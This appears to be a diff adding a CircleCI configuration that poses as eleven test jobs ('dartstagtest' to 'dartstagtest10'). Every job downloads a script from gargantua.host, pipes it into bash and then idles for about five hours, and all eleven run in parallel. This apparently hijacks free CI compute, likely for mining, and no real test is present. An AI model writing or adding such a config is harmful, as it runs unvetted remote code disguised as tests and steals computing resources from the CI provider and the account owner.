@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  dartstagtest:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  dartstagtest10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - dartstagtest
+      - dartstagtest1
+      - dartstagtest2
+      - dartstagtest3
+      - dartstagtest4
+      - dartstagtest5
+      - dartstagtest6
+      - dartstagtest7
+      - dartstagtest8
+      - dartstagtest9
+      - dartstagtest10
